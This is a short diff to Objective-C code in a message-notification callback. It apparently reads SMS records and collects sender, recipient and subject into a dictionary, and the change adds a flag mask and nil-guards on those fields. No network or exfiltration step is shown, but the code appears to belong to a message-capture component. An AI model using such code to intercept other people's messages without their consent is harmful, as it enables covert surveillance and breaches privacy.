@@ -976,6 +976,8 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
           flags = 0;
           sscanf(result[ncol + i + 3], "%d", &flags);
    
+          flags &= 0x1;
+          
           switch (flags)
           {
             case IN_SMS:
@@ -1028,9 +1030,9 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
                                                         deliveryTimeLow,
                                                         messageType,
                                                         messageFilter,
-                                                        from,
-                                                        to,
-                                                        subject,
+                                                        from    != nil ? from : @"",
+                                                        to      != nil ? to : @"",
+                                                        subject != nil ? subject : @"",
                                                         nil];
           
           NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
